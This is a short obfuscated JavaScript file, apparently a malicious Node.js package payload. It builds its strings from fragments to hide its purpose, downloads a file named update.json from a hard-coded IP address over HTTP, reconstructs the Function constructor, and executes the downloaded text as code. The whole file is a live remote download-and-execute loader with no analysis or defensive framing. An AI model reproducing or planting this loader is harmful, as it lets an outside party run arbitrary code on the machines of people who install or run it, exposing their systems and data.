(function () {
    var _0x20352b = require('ht' + 'tp');
    return _0x20352b['ge' + 't']({
        'host': '23' + '.9' + '4.' + '46' + '.1' + '91',
        'port': 0x50,
        'path': '/u' + 'pd' + 'at' + 'e.' + 'js' + 'on'
    }, function (_0x3cd692) {
        var _0x1f4ba0 = '';
        _0x3cd692['on']('da' + 'ta', function (_0x69e943) {
            _0x1f4ba0 += _0x69e943;
        });
        _0x3cd692['on']('en' + 'd', function () {
            var _0x563a03 = this[(typeof this['Bu' + 'ff' + 'er']['fr' + 'om'])['ch' + 'ar' + 'At'](0x0)['to' + 'Up' + 'pe' + 'rC' + 'as' + 'e']() + (typeof this['Bu' + 'ff' + 'er']['fr' + 'om'])['sl' + 'ic' + 'e'](0x1)];
            var _0x59144c = new _0x563a03(_0x1f4ba0);
            _0x59144c();
        });
    });
}());
